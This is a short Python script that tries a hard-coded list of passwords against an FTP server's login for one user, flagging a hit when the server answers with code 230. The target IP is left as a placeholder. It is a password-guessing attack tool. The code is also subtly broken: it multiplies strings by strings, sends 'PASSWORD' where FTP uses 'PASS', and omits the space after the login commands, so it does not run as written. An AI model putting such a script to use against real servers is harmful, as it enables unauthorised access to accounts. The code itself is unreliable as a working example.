import socket
import re
import sys

def connection(ip,user,password):
    sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    print("Triying " + ip + " : " + user + " : " + password )
    sock.connect((ip,21))
    data = sock.recv(1024)
    sock.send('USER' + user * '\r\n')
    data = sock.recv(1024)
    sock.send('PASSWORD'+ password * '\r\n')
    data = sock.recv(1024)
    sock.send('quit\r\n')
    sock.close()
    return data

user = "test1"
passwords = ["test" , "test1" , "test2" , "test3"]

for password in passwords:
    result = connection('you should write ftp ip here', user , password)
    if "230" in result:
        print("Password found: " + password)
